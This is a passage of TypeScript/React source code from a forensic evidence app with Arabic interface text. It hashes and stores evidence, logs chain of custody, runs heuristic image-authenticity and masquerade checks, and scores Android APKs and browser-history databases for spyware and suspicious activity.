        fileName: `استلام دليل: ${fileName}`,
        fileSize: fileSizeFormatted,
        verdict,
        score: authenticityScore,
        risk: riskLevel,
        type: effectiveMime.startsWith('image/') ? 'image' : 'clipboard',
        sha256: binaryInfo.sha256
      }, { fileSizeRaw: fileSize, aiProbability });

      const saved = await saveEvidenceToCloud(
        fileName,
        fileSize,
        effectiveMime,
        binaryInfo.sha256,
        binaryInfo.sha1,
        binaryInfo.sha512,
        binaryInfo.md5,
        result,
        buffer,
        previewBlobUrl
      );

      if (saved) {
        setEvidenceLocalInspection(prev => prev ? {
          ...prev,
          syncedToCloud: saved.storageStatus === 'cloud',
          fileUrl: saved.fileUrl,
          storagePath: saved.storagePath,
          evidenceId: saved.evidenceId
        } : null);
        if (saved.storageStatus === 'cloud') {
          notifyStatus('تم فحص البصمة والـ Hex محلياً ورفع الدليل إلى Firebase Storage وحفظه في Firestore.', 'success');
        } else {
          notifyStatus('تم فحص البصمة SHA-256 وقراءة Hex Bytes محلياً بنجاح.', 'success');
          setStorageUploadState({
            active: false,
            fileName,
            progress: 100,
            bytesTransferred: fileSize,
            totalBytes: fileSize,
            status: 'done',
            message: 'تم الفحص المحلي وحساب SHA-256 بنجاح (الوضع المحلي المعزول).'
          });
        }
      }
    } catch (err: any) {
      console.error('Evidence vault upload error:', err);
      setStorageUploadState({
        active: false,
        fileName,
        progress: 0,
        bytesTransferred: 0,
        totalBytes: fileSize,
        status: 'error',
        message: err?.message || 'حدث خطأ أثناء معالجة الملف'
      });
      notifyStatus('تعذر فحص أو رفع الملف.', 'error');
    }
  };

  const syncEvidenceToCloud = async (ev: Evidence) => {
    if (!auth.currentUser) {
      notifyStatus('المصادقة السحابية مطلوبة للرفع إلى Firebase Storage و Firestore.', 'warning');
      return;
    }

    try {
      const cached = localFilesCacheRef.current.get(ev.sha256);
      let fileUrl = ev.fileUrl;
      let storagePath = ev.storagePath || '';
      let storageStatus: 'cloud' | 'local' = ev.storageStatus === 'cloud' ? 'cloud' : 'local';

      if (cached) {
        const uploaded = await uploadFileToFirebaseStorage(cached.blob, ev.fileName, ev.mimeType, {
          sha256: ev.sha256,
          sha1: ev.sha1 || '',
          md5: ev.md5 || '',
          detectedFileType: ev.analysis?.detectedFileType || ev.mimeType,
          investigationId: ev.investigationId
        });
        fileUrl = uploaded.downloadUrl;
        storagePath = uploaded.storagePath;
        storageStatus = 'cloud';
      }

      const evDocRef = doc(db, 'evidence', ev.id);
      const existingSnap = await getDoc(evDocRef);
      const payload = {
        userId: auth.currentUser.uid,
        investigationId: ev.investigationId || currentInvestigationId || 'inv-sovereign-default',
        fileName: ev.fileName,
        fileUrl: fileUrl.startsWith('blob:') ? '' : fileUrl,
        storagePath,
        storageStatus,
        fileSize: ev.fileSize,
        mimeType: ev.mimeType,
        sha256: ev.sha256,
        sha1: ev.sha1 || '',
        sha512: ev.sha512 || '',
        md5: ev.md5 || '',
        analysis: ev.analysis,
        createdAt: ev.createdAt || new Date().toISOString()
      };

      if (existingSnap.exists()) {
        await updateDoc(evDocRef, {
          fileUrl: payload.fileUrl,
          storagePath: payload.storagePath,
          storageStatus: payload.storageStatus
        });
      } else {
        await setDoc(evDocRef, payload);
        // Sync any local custody chain blocks while preserving their exact evidenceId & SHA-256 recordHashes
        try {
          const localChain: ChainOfCustodyEntry[] = JSON.parse(localStorage.getItem(`sovereign_custody_${ev.id}`) || '[]');
          for (const block of localChain) {
            await addDoc(collection(db, 'evidence', ev.id, 'chain_of_custody'), {
              evidenceId: block.evidenceId,
              userId: auth.currentUser.uid,
              officerName: block.officerName || userProfile?.displayName || 'محقق سيادي',
              action: block.action,
              location: block.location,
              notes: block.notes,
              timestamp: block.timestamp,
              prevHash: block.prevHash || '',
              recordHash: block.recordHash || ''
            });
          }
        } catch (chainSyncErr) {
          console.warn('Custody chain sync note:', chainSyncErr);
        }
      }

      setEvidenceList(prev => prev.map(item => item.id === ev.id ? { ...item, fileUrl, storagePath, storageStatus } : item));
      notifyStatus(
        storageStatus === 'cloud'
          ? 'تم رفع الملف إلى Firebase Storage ومزامنة سجله في Firestore.'
          : 'تمت مزامنة السجل الجنائي في Firestore.',
        'success'
      );
    } catch (err: any) {
      console.error('Sync evidence to cloud error:', err);
      notifyStatus('فشل رفع أو مزامنة الدليل: ' + (err?.message || ''), 'error');
    }
  };

  const deleteEvidenceItem = async (ev: Evidence) => {
    try {
      if (auth.currentUser) {
        if (ev.storagePath) {
          try {
            await deleteObject(ref(storage, ev.storagePath));
          } catch (stErr: any) {
            if (stErr?.code !== 'storage/object-not-found') {
              console.warn('Storage delete warning:', stErr);
            }
          }
        }
        try {
          await deleteDoc(doc(db, 'evidence', ev.id));
        } catch (dbErr) {
          console.error('Firestore delete evidence error:', dbErr);
          handleFirestoreError(dbErr, OperationType.DELETE, `evidence/${ev.id}`);
        }
      }

      setEvidenceList(prev => {
        const updated = prev.filter(item => item.id !== ev.id);
        try {
          localStorage.setItem('sovereign_evidence_local', JSON.stringify(updated));
          localStorage.removeItem(`sovereign_custody_${ev.id}`);
        } catch (_) {}
        return updated;
      });
      if (selectedEvidenceForHistory === ev.id) {
        setSelectedEvidenceForHistory(null);
        setCustodyHistory([]);
      }
      await recordCustodyLedgerBlock(
        ev.id,
        'CASE_MANAGEMENT',
        `حذف دليل رقمي من السجل والتخزين (${ev.fileName})`,
        'إدارة الأدلة والخزنة السحابية',
        `SHA-256=${ev.sha256}`
      );
      notifyStatus(`تم حذف الدليل (${ev.fileName}) وتوثيق الإجراء في سلسلة الحفظ.`, 'success');
    } catch (err) {
      console.error('Delete evidence failed:', err);
      notifyStatus('تعذر حذف الدليل.', 'error');
    }
  };

  const processImageFile = async (
    dataUrl: string, 
    name: string, 
    sizeBytes: number, 
    sizeFormatted: string, 
    lastModified: string, 
    mimeType: string, 
    rawBuffer: ArrayBuffer
  ) => {
    setIsAnalyzing(true);

    try {
      const binaryInfo = await analyzeFileBinary(rawBuffer, name, mimeType);
      const { 
        hexBytes, 
        extendedHexBytes,
        totalByteLength,
        headerHex, 
        headerAscii, 
        detectedFileType, 
        mimeTypeDetected, 
        expectedExtensions,
        entropy, 
        entropyClassification, 
        isMasqueraded, 
        masqueradeWarning,
        sha256,
        sha1,
        sha512,
        md5
      } = binaryInfo;

      setHexInspectorData({
        fileName: name,
        totalBytes: totalByteLength || sizeBytes,
        bytes: extendedHexBytes || hexBytes,
        headerHex,
        headerAscii,
        detectedFileType,
        expectedExtensions,
        entropy,
        entropyClassification,
        isMasqueraded,
        masqueradeWarning,
      });
      setHexPageOffset(0);
      setHexSelectedByteIndex(null);

      const exifResult = parseRealExif(rawBuffer);

      // Check for duplicates in Firestore or local evidence registry
      if (auth.currentUser) {
        try {
          const q = query(
            collection(db, 'evidence'),
            where('userId', '==', auth.currentUser.uid),
            where('sha256', '==', sha256)
          );
          const snapshot = await Promise.race([
            getDocs(q),
            new Promise<any>((_, reject) => setTimeout(() => reject(new Error('timeout')), 2000))
          ]);
          if (snapshot && !snapshot.empty) {
            const existingDoc = snapshot.docs[0];
            const existingData = existingDoc.data() as Evidence;
            setLastAnalyzedEvidenceId(existingDoc.id);
            const mergedAnalysis: ForensicResult = {
              ...existingData.analysis,
              exif: exifResult.hasExif ? exifResult : existingData.analysis.exif,
            };
            setAnalysisResult(mergedAnalysis);
            const viewUrl = existingData.fileUrl || dataUrl;
            setSelectedImage(viewUrl);
            if (viewUrl) {
              const dupImg = new Image();
              if (!viewUrl.startsWith('blob:') && !viewUrl.startsWith('data:')) {
                dupImg.crossOrigin = 'anonymous';
              }
              dupImg.onload = async () => {
                const { url: elaUrl } = await generateRealELA(dupImg, elaSlider, elaQuality, elaMode);
                setElaImage(elaUrl);
              };
              dupImg.src = viewUrl;
            }
            setIsAnalyzing(false);
            recordCustodyLedgerBlock(
              existingDoc.id,
              'FILE_INSPECTION',
              `إعادة فحص ومطابقة بصمة الملف (${name})`,
              'مختبر الفحص الثنائي والـ ELA',
              `تطابق البصمة SHA-256=${sha256.substring(0, 20)}... مع الدليل المسجل مسبقاً.`
            );
            notifyStatus('تم رصد تطابق البصمة SHA-256: هذا الملف محفوظ مسبقاً في سجل الأدلة.', 'warning');
            return;
          }
        } catch (dupErr) {
          console.warn('Duplicate check skipped:', dupErr);
        }
      }

      const fileExt = name.includes('.') ? name.split('.').pop()?.toLowerCase() || '' : '';
      const isKnownImage = (['jpg', 'jpeg', 'png', 'gif', 'webp', 'bmp'].includes(fileExt) || 
        mimeType.startsWith('image/') || 
        detectedFileType.includes('JPEG') || 
        detectedFileType.includes('PNG') || 
        detectedFileType.includes('GIF') || 
        detectedFileType.includes('WebP')) && !isMasqueraded;

      const finalizeForensicResult = async (
        visualProps?: { width: number; height: number; variance: number; noise: number; elaScore: number; aiProb: number; displayUrl: string }
      ) => {
        const aiProbability = visualProps ? visualProps.aiProb : (isMasqueraded ? 95 : (entropy >= 7.2 ? 75 : 10));
        const authenticityScore = Math.max(1, Math.min(99, 100 - aiProbability));
        
        let verdict = '';
        let riskLevel = '';
        const indicators: string[] = [];

        if (isMasqueraded) {
          verdict = 'تمويه خطير للملف (Masqueraded / Extension Spoofing)';
          riskLevel = 'حرج';
          indicators.push(masqueradeWarning || 'عدم تطابق امتداد الملف مع الترويسة الحقيقية');
        } else if (entropy >= 7.2) {
          verdict = 'ملف مشفر أو مغلف ببرمجية ضغط/تشفير (Packed / High Entropy)';
          riskLevel = 'مرتفع';
          indicators.push(`إنتروبيا عالية جداً (${entropy}/8.0): تدل على تشفير البيانات أو استخدام Packer مثل UPX`);
        } else if (authenticityScore >= 85) {
          verdict = visualProps ? 'صورة موثوقة / حقيقية التقطت عبر عدسة (Authentic Capture)' : 'ملف أصلي موثق الترويسة والبصمة (Authentic File Verified)';
          riskLevel = 'منخفض';
          indicators.push(`تطابق ترويسة Magic Bytes مع الامتداد (${detectedFileType})`);
          indicators.push(`بصمة التجزئة SHA-256 و SHA-512 محسوبة عبر WebCrypto`);
        } else {
          verdict = 'ملف يتطلب تدقيقاً جنائياً إضافياً';
          riskLevel = 'متوسط';
          indicators.push(`إنتروبيا الملف: ${entropy}/8.0 (${entropyClassification})`);
        }

        const detailedReport = isMasqueraded
          ? `تحذير أمني حرج: تم فحص الترويسة الحقيقية وتبين أن الملف (${name}) يتنكر بامتداد مختلف ولكنه في الحقيقة (${detectedFileType}). ترويسة البايتات السحرية: ${headerHex}.`
          : `تم إجراء الفحص الجنائي الثنائي وحساب بصمات WebCrypto (SHA-256, SHA-512, SHA-1, MD5). نوع الملف المكتشف عبر Magic Bytes: ${detectedFileType}. قيمة إنتروبيا شانون: ${entropy}/8.0 (${entropyClassification}).`;

        const result: ForensicResult = {
          fileName: name,
          fileSize: sizeBytes,
          fileSizeFormatted: sizeFormatted,
          lastModified,
          mimeType: mimeTypeDetected || mimeType,
          width: visualProps?.width || 0,
          height: visualProps?.height || 0,
          sha256,
          sha1,
          sha512,
          md5,
          hexBytes,
          detectedFileType,
          expectedExtensions,
          exif: exifResult,
          laplacianVariance: visualProps?.variance || 0,
          sensorGrainNoise: visualProps?.noise || 0,
          elaScore: visualProps?.elaScore || 0,
          aiProbability,
          authenticityScore,
          verdict,
          riskLevel,
          localReport: {
            verdict,
            riskLevel,
            detailedReport,
            indicators
          },
          entropy,
          entropyClassification,
          headerHex,
          headerAscii,
          isMasqueraded,
          masqueradeWarning
        };

        setAnalysisResult(result);
        setSelectedImage(visualProps?.displayUrl || (isKnownImage ? dataUrl : ''));
        setImageName(name);
        setIsAnalyzing(false);

        saveAuditLog({
          id: Math.random().toString(36).substring(2, 9),
          timestamp: new Date().toISOString(),
          fileName: name,
          fileSize: sizeFormatted,
          verdict,
          score: authenticityScore,
          risk: riskLevel,
          type: isKnownImage ? 'image' : 'clipboard',
          sha256
        }, { laplacianVariance: visualProps?.variance || 0, aiProbability, sha256, fileSizeRaw: sizeBytes });

        if (user) {
          saveEvidenceToCloud(name, sizeBytes, mimeTypeDetected || mimeType, sha256, sha1, sha512, md5, result, rawBuffer, visualProps?.displayUrl || (isKnownImage ? dataUrl : ''));
        } else {
          recordCustodyLedgerBlock(
            `inspect-${sha256.substring(0, 12)}`,
            'FILE_INSPECTION',
            `فحص ملف وتحليل البايتات (${name})`,
            'وحدة التحليل الجنائي المحلية',
            `SHA-256=${sha256.substring(0, 18)}... | الصيغة: ${detectedFileType} | النتيجة: ${verdict}`
          );
        }
      };

      if (!isKnownImage) {
        await finalizeForensicResult();
        return;
      }

      const img = new Image();
      if (!dataUrl.startsWith('blob:') && !dataUrl.startsWith('data:')) {
        img.crossOrigin = 'anonymous';
      }

      let finished = false;
      const timeoutTimer = setTimeout(() => {
        if (!finished) {
          finished = true;
          finalizeForensicResult();
        }
      }, 5000);

      img.onerror = () => {
        if (!finished) {
          finished = true;
          clearTimeout(timeoutTimer);
          finalizeForensicResult();
        }
      };

      img.onload = async () => {
        if (finished) return;
        finished = true;
        clearTimeout(timeoutTimer);

        try {
          const { variance, noise, downscaledUrl } = await calculateRealLaplacianVariance(img);
          const displayUrl = downscaledUrl || dataUrl;

          const { url: elaUrl, result: elaRes } = await generateRealELA(img, elaSlider, elaQuality, elaMode);
          setElaImage(elaUrl);

          let aiProb = 0;
          if (!exifResult.hasExif) aiProb += 5; else aiProb -= 10;
          if (noise < 1.5) aiProb += 35; else aiProb -= 15;
          if (variance > 2500 && noise < 1.5) aiProb += 20;
          if (elaRes.elaTamperScore >= 60) aiProb += Math.round(elaRes.elaTamperScore * 0.45);
          aiProb = Math.max(2, Math.min(98, aiProb));

          await finalizeForensicResult({
            width: img.naturalWidth || img.width,
            height: img.naturalHeight || img.height,
            variance,
            noise,
            elaScore: elaRes.elaTamperScore,
            aiProb,
            displayUrl
          });
        } catch (_) {
          await finalizeForensicResult();
        }
      };

      img.src = dataUrl;
    } catch (e) {
      console.error('processImageFile root error:', e);
      setIsAnalyzing(false);
    }
  };

  const copyToClipboard = (text: string, label: string) => {
    navigator.clipboard.writeText(text);
    setCopiedHash(label);
    setTimeout(() => setCopiedHash(null), 2000);
  };

  const downloadAuditReport = () => {
    if (!analysisResult) return;
    const reportStr = JSON.stringify(analysisResult, null, 2);
    const blob = new Blob([reportStr], { type: 'application/json' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `forensic_audit_report_${analysisResult.fileName}.json`;
    a.click();
    URL.revokeObjectURL(url);
  };

  // Android APK Forensics Pipeline (Binary Extraction + Neural-X Daemon Evaluation + Threat Log Update)
  const evaluateApkWithCoreDaemon = async (
    staticData: ApkStaticForensicsResult & {
      sha256: string;
      sha1: string;
      sha512: string;
      md5: string;
      entropy: number;
      entropyClassification: string;
      headerHex: string;
    },
    rawBuffer?: ArrayBuffer
  ) => {
    setApkStage('ai_evaluating');
    setApkError(null);
    setApkAnalyzing(true);
    try {
      let data: any = null;
      let useLocalApkEval = false;
      try {
        const res = await fetch(apiUrl('/api/analyze-apk'), {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ apkData: staticData })
        });
        const parsed = await safeReadJsonResponse(res);
        if (res.ok && parsed.isJson && parsed.data) {
          data = parsed.data;
        } else if (res.status === 404 || res.status === 405 || !parsed.isJson) {
          useLocalApkEval = true;
        } else {
          throw new Error(parsed.data?.error || 'تعذر الحصول على تقييم Neural-X Security Daemon لحزمة APK.');
        }
      } catch (reqErr: any) {
        if (!useLocalApkEval && reqErr instanceof TypeError) {
          useLocalApkEval = true;
        } else if (!useLocalApkEval) {
          throw reqErr;
        }
      }

      if (useLocalApkEval || !data) {
        const critCount = staticData.criticalPermissionsCount || 0;
        const sensCount = staticData.sensitivePermissionsCount || 0;
        const suspTriggers = staticData.suspiciousTriggers || [];
        const insecureUrls = (staticData.urls || []).filter((u) => u.riskTag === 'insecure_http' || u.riskTag === 'suspicious');
        const computedScore = Math.min(
          98,
          Math.max(8, critCount * 16 + sensCount * 4 + suspTriggers.length * 10 + insecureUrls.length * 4)
        );
        const isSpyware = critCount >= 2 || computedScore >= 65 || suspTriggers.length >= 2;
        const riskLevel = computedScore >= 80 ? 'حرج' : computedScore >= 60 ? 'مرتفع' : computedScore >= 35 ? 'متوسط' : 'منخفض';
        data = {
          classification: isSpyware ? 'حزمة تجسس/تهديد محتمل (Spyware / Riskware)' : computedScore >= 35 ? 'حزمة تتطلب مراجعة أمنية' : 'حزمة تطبيق قياسية',
          isSpyware,
          riskLevel,
          threatScore: computedScore,
          executiveSummary: `تم فحص الحزمة الحقيقية (${staticData.fileName}) عبر فك الضغط الفعلي بـ JSZip واستخراج ${staticData.totalEntries} ملفاً و${staticData.permissions.length} إذناً (${critCount} حرج، ${sensCount} حساس) و${staticData.endpointUrlsCount} رابطاً خارجياً.`,
          spywareIndicators: [
            ...suspTriggers,
            ...staticData.permissions.filter((p) => p.severity === 'critical').map((p) => `إذن حرج: ${p.shortName} — ${p.description}`),
          ].slice(0, 10),
          networkAssessment: `تم رصد ${staticData.endpointUrlsCount} نقطة اتصال خارجية و${staticData.ips.length} عنوان IP مضمن داخل ملفات الحزمة المفكوكة.`,
          recommendations: isSpyware
            ? ['عدم تثبيت الحزمة على الأجهزة الحساسة ومراجعة الأذونات الحرجة.', 'فحص النطاقات وعناوين IP المستخرجة في قسم الاستخبارات (OSINT).']
            : ['الاحتفاظ بالبصمات التشفيرية (SHA-256) ومقارنة الأذونات مع الغرض الفعلي للتطبيق.'],
          permissionsAssessment: staticData.permissions.slice(0, 15).map((p) => ({
            permission: p.shortName,
            severity: p.severity === 'critical' ? 'حرج' : p.severity === 'high' ? 'مرتفع' : p.severity === 'medium' ? 'متوسط' : 'منخفض',
            reason: p.description,
          })),
          analyzedAt: new Date().toISOString(),
          modelUsed: 'Sovereign Client JSZip & AXML Static Core v2.5',
        };
      }

      setApkAiReport(data);
      setApkStage('done');

      const threatScore = Math.min(99, Math.max(1, Math.round(Number(data.threatScore) || (data.isSpyware ? 88 : 15))));
      const authenticityScore = Math.max(1, Math.min(99, 100 - threatScore));
      const verdictText = `[APK ${data.classification}] ${staticData.packageName || staticData.fileName} — ${data.isSpyware ? 'رصد سلوك تجسسي (Spyware)' : 'فحص تطبيق أندرويد'}`;

      // Immediately update Audit / Threat Logs (Firestore + Local)
      await saveAuditLog({
        id: 'apk-' + Math.random().toString(36).substring(2, 9),
        timestamp: new Date().toISOString(),
        fileName: `فحص APK: ${staticData.fileName}`,
        fileSize: formatFileSize(staticData.fileSize),
        verdict: verdictText,
        score: authenticityScore,
        risk: data.riskLevel || (data.isSpyware ? 'حرج' : 'منخفض'),
        type: 'clipboard',
        sha256: staticData.sha256
      }, { fileSizeRaw: staticData.fileSize, aiProbability: threatScore });

      // Save Evidence & Update Dashboard Threats immediately
      if (rawBuffer) {
        const apkForensicResult: ForensicResult = {
          fileName: staticData.fileName,
          fileSize: staticData.fileSize,
          fileSizeFormatted: formatFileSize(staticData.fileSize),
          lastModified: staticData.extractionTimestamp,
          mimeType: 'application/vnd.android.package-archive',
          width: 0,
          height: 0,
          sha256: staticData.sha256,
          sha1: staticData.sha1,
          sha512: staticData.sha512,
          md5: staticData.md5,
          hexBytes: [],
          detectedFileType: 'حزمة تطبيق أندرويد (Android APK Archive)',
          expectedExtensions: ['apk'],
          exif: { hasExif: false, message: 'AndroidManifest.xml Parsed' },
          laplacianVariance: 0,
          sensorGrainNoise: 0,
          elaScore: 0,
          aiProbability: threatScore,
          authenticityScore,
          verdict: verdictText,
          riskLevel: data.riskLevel || 'متوسط',
          localReport: {
            verdict: data.classification,
            riskLevel: data.riskLevel,
            detailedReport: data.executiveSummary,
            indicators: data.spywareIndicators || []
          },
          entropy: staticData.entropy,
          entropyClassification: staticData.entropyClassification,
          headerHex: staticData.headerHex,
          isMasqueraded: !staticData.hasAndroidManifest,
          masqueradeWarning: !staticData.hasAndroidManifest ? 'حزمة APK تفتقر إلى AndroidManifest.xml القياسي' : null
        };
        await saveEvidenceToCloud(
          staticData.fileName,
          staticData.fileSize,
          'application/vnd.android.package-archive',
          staticData.sha256,
          staticData.sha1,
          staticData.sha512,
          staticData.md5,
          apkForensicResult,
          rawBuffer,
          ''
        );
      }

      await recordCustodyLedgerBlock(
        `apk-${staticData.sha256.substring(0, 14)}`,
        'FILE_INSPECTION',
        `تحليل حزمة APK وتقييم Spyware عبر Sovereign Core Engine (${staticData.fileName})`,
        'مختبر تحليل تطبيقات أندرويد (APK Forensics)',
        `الحزمة: ${staticData.packageName || 'غير محددة'} | الأذونات: ${staticData.permissions.length} (حرجة: ${staticData.criticalPermissionsCount}) | روابط: ${staticData.endpointUrlsCount} | IPs: ${staticData.ips.length} | حكم المحرك: ${data.classification} (${data.riskLevel})`
      );

      notifyStatus(
        data.isSpyware
          ? `تحذير أمني حرج: رصد سلوك تجسسي في ${staticData.fileName} وتم تحديث سجل التهديدات فوراً!`
          : `اكتمل فحص ${staticData.fileName} عبر Neural-X Security Daemon وتم تحديث سجل العمليات.`,
        data.isSpyware ? 'error' : 'success'
      );
    } catch (err: any) {
      console.error('APK Core Daemon evaluation failed:', err);
      setApkError(err?.message || 'حدث خطأ أثناء تقييم حزمة APK عبر وحدة Sovereign Core Engine.');
      setApkStage('error');
      notifyStatus('تعذر إكمال التقييم السحابي — البيانات الثابتة المستخرجة معروضة أدناه.', 'warning');
    } finally {
      setApkAnalyzing(false);
    }
  };

  const handleApkForensicUpload = async (file: File) => {
    setApkAnalyzing(true);
    setApkStage('extracting');
    setApkError(null);
    setApkAiReport(null);
    setApkStaticResult(null);

    try {
      const buffer = await file.arrayBuffer();
      const binaryInfo = await analyzeFileBinary(buffer, file.name, file.type || 'application/vnd.android.package-archive');
      const isZipHeader = binaryInfo.headerHex.startsWith('50 4B');
      if (!isZipHeader && !file.name.toLowerCase().endsWith('.apk')) {
        throw new Error('الملف المرفوع ليس حزمة Android APK صالحة (ترويسة ZIP 50 4B مفقودة).');
      }

      const extracted = await analyzeApkBuffer(buffer, file.name);
      if (!extracted.hasAndroidManifest && extracted.dexFiles.length === 0) {
        throw new Error('الأرشيف لا يحتوي على AndroidManifest.xml أو ملفات classes.dex الخاصة بتطبيقات أندرويد.');
      }

      const combinedStatic = {
        ...extracted,
        sha256: binaryInfo.sha256,
        sha1: binaryInfo.sha1,
        sha512: binaryInfo.sha512,
        md5: binaryInfo.md5,
        entropy: binaryInfo.entropy,
        entropyClassification: binaryInfo.entropyClassification,
        headerHex: binaryInfo.headerHex
      };
      setApkStaticResult(combinedStatic);
      localFilesCacheRef.current.set(binaryInfo.sha256, {
        blob: new Blob([buffer], { type: 'application/vnd.android.package-archive' }),
        name: file.name,
        mimeType: 'application/vnd.android.package-archive'
      });

      await evaluateApkWithCoreDaemon(combinedStatic, buffer);
    } catch (err: any) {
      console.error('APK Extraction Error:', err);
      setApkError(err?.message || 'تعذر تفكيك وفحص حزمة APK.');
      setApkStage('error');
      setApkAnalyzing(false);
      notifyStatus(err?.message || 'فشل تفكيك ملف APK.', 'error');
    }
  };

  const downloadApkJsonReport = () => {
    if (!apkStaticResult) return;
    const dossier = {
      platform: 'SOVEREIGN FORENSIC ENGINE v2.5.2 — Android APK Forensics',
      generatedAt: new Date().toISOString(),
      fileInfo: {
        fileName: apkStaticResult.fileName,
        fileSize: apkStaticResult.fileSize,
        sha256: apkStaticResult.sha256,
        sha1: apkStaticResult.sha1,
        md5: apkStaticResult.md5,
        entropy: apkStaticResult.entropy,
        entropyClassification: apkStaticResult.entropyClassification,
      },
      manifestAnalysis: {
        packageName: apkStaticResult.packageName,
        manifestFormat: apkStaticResult.manifestFormat,
        permissionsCount: apkStaticResult.permissions.length,
        criticalPermissionsCount: apkStaticResult.criticalPermissionsCount,
        permissions: apkStaticResult.permissions,
        suspiciousTriggers: apkStaticResult.suspiciousTriggers,
      },
      networkIndicators: {
        endpointUrlsCount: apkStaticResult.endpointUrlsCount,
        urls: apkStaticResult.urls,
        ips: apkStaticResult.ips,
      },
      sovereignCoreVerdict: apkAiReport || { status: 'Not completed', error: apkError },
    };
    const blob = new Blob([JSON.stringify(dossier, null, 2)], { type: 'application/json' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `apk_forensic_report_${apkStaticResult.fileName}.json`;
    a.click();
    URL.revokeObjectURL(url);
  };

  // Browser History & SQLite Artifact Extractor Pipeline (SQLite WASM Extraction + Automated Parser Core Analysis + Dashboard Threat Update)
  const evaluateBrowserHistoryWithParserCore = async (
    staticData: SqliteBrowserForensicsResult & {
      sha256: string;
      sha1: string;
      sha512: string;
      md5: string;
      entropy: number;
      entropyClassification: string;
    },
    rawBuffer?: ArrayBuffer
  ) => {
    setBrowserStage('ai_evaluating');
    setBrowserError(null);
    setBrowserAnalyzing(true);
    try {
      const res = await fetch(apiUrl('/api/analyze-browser-history'), {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ historyData: staticData }),
      });
      const parsed = await safeReadJsonResponse(res);
      const data = parsed.data || {};
      if (!res.ok || !parsed.isJson) {
        throw new Error(data.error || 'تعذر الحصول على تقييم Automated Parser Core لسجل التصفح.');
      }

      setBrowserAiReport(data);
      setBrowserStage('done');

      const suspiciousCount = Array.isArray(data.suspiciousSites) ? data.suspiciousSites.length : 0;
      const isThreat = Boolean(data.hasSuspiciousActivity) || suspiciousCount > 0;
      const rawThreatScore = Number(data.threatScore);
      const threatScore = Math.min(
        99,
        Math.max(1, Math.round(Number.isFinite(rawThreatScore) ? rawThreatScore : isThreat ? 80 : 12))
      );
      const authenticityScore = isThreat
        ? Math.min(45, Math.max(1, 100 - Math.max(threatScore, 55)))
        : Math.max(55, Math.min(99, 100 - threatScore));
      const verdictText = `[SQLite ${staticData.browserEngine}] ${staticData.fileName} — ${
        isThreat
          ? `رصد ${suspiciousCount} موقع/رابط مشبوه`
          : data.behaviorClassification || 'سجل تصفح طبيعي'
      }`;

      await saveAuditLog(
        {
          id: 'hist-' + Math.random().toString(36).substring(2, 9),
          timestamp: new Date().toISOString(),
          fileName: `سجل المتصفح: ${staticData.fileName}`,
          fileSize: formatFileSize(staticData.fileSize),
          verdict: verdictText,
          score: authenticityScore,
          risk: data.riskLevel || (isThreat ? 'حرج' : 'منخفض'),
          type: 'clipboard',
          sha256: staticData.sha256,
        },
        { fileSizeRaw: staticData.fileSize, aiProbability: threatScore }
      );

      const effectiveBuffer = rawBuffer || browserBufferRef.current;
      if (effectiveBuffer) {
        const sqliteForensicResult: ForensicResult = {
          fileName: staticData.fileName,
          fileSize: staticData.fileSize,
          fileSizeFormatted: formatFileSize(staticData.fileSize),
          lastModified: staticData.extractionTimestamp,
          mimeType: 'application/x-sqlite3',
          width: 0,
          height: 0,
          sha256: staticData.sha256,
          sha1: staticData.sha1,
          sha512: staticData.sha512,
          md5: staticData.md5,
          hexBytes: [],
          detectedFileType: `قاعدة بيانات متصفح SQLite (${staticData.browserLabel})`,
          expectedExtensions: ['sqlite', 'db', 'sqlite3'],
          exif: {
            hasExif: false,
            message: `${staticData.totalUrlsCount} URLs | ${staticData.totalVisitsCount} Visits | ${suspiciousCount} Flagged by Threat Daemon`,
          },
          laplacianVariance: 0,
          sensorGrainNoise: 0,
          elaScore: 0,
          aiProbability: threatScore,
          authenticityScore,
          verdict: verdictText,
          riskLevel: data.riskLevel || 'متوسط',
          localReport: {
            verdict: data.behaviorClassification,
            riskLevel: data.riskLevel,
            detailedReport: data.executiveSummary,
            indicators: (data.suspiciousSites || []).map(
              (s: any) => `${s.domain} (${s.severity}): ${s.reason}`
            ),
          },
          entropy: staticData.entropy,
          entropyClassification: staticData.entropyClassification,
          headerHex: '53 51 4C 69 74 65 20 66',
          isMasqueraded: false,
          masqueradeWarning: null,
        };
        await saveEvidenceToCloud(
          staticData.fileName,
          staticData.fileSize,
          'application/x-sqlite3',
          staticData.sha256,
          staticData.sha1,
          staticData.sha512,
          staticData.md5,
          sqliteForensicResult,
          effectiveBuffer,
          ''
        );
      }

      await recordCustodyLedgerBlock(
        `sqlite-${staticData.sha256.substring(0, 14)}`,
        'FILE_INSPECTION',
        `تحليل سجل متصفح SQLite عبر Automated Parser Core (${staticData.fileName})`,
        'مختبر استخراج قواعد بيانات المتصفحات',
        `المحرك: ${staticData.browserLabel} | الروابط: ${staticData.totalUrlsCount} | الزيارات: ${staticData.totalVisitsCount} | مواقع مشبوهة: ${suspiciousCount} | الخطورة: ${data.riskLevel}`
      );

      notifyStatus(
        isThreat
          ? `تنبيه أمني: رصد محرك Threat Hunting عدد (${suspiciousCount}) موقع مشبوه في ${staticData.fileName} وتم تحديث عدادات التهديدات فوراً!`
          : `اكتمل فحص قاعدة بيانات المتصفح ${staticData.fileName} بنجاح وتم تحديث السجل.`,
        isThreat ? 'error' : 'success'
      );
    } catch (err: any) {
      console.error('Browser History Daemon Error:', err);
      setBrowserError(err?.message || 'حدث خطأ أثناء تقييم سجل التصفح عبر وحدة Automated Parser Core.');
      setBrowserStage('error');
      notifyStatus('تعذر إكمال الفحص المتقدم — بيانات SQLite المستخرجة معروضة أدناه.', 'warning');
    } finally {
      setBrowserAnalyzing(false);
    }
  };

  const handleBrowserSqliteUpload = async (file: File) => {
    setBrowserAnalyzing(true);
    setBrowserStage('extracting');
    setBrowserError(null);
    setBrowserAiReport(null);
    setBrowserStaticResult(null);
    setBrowserSearchQuery('');
    setBrowserOnlyFlagged(false);

    try {
      const buffer = await file.arrayBuffer();
      browserBufferRef.current = buffer;
      const binaryInfo = await analyzeFileBinary(buffer, file.name, file.type || 'application/x-sqlite3');
      const extracted = await analyzeSqliteBrowserDatabase(buffer, file.name);

      const combinedStatic = {
        ...extracted,
        sha256: binaryInfo.sha256,
        sha1: binaryInfo.sha1,
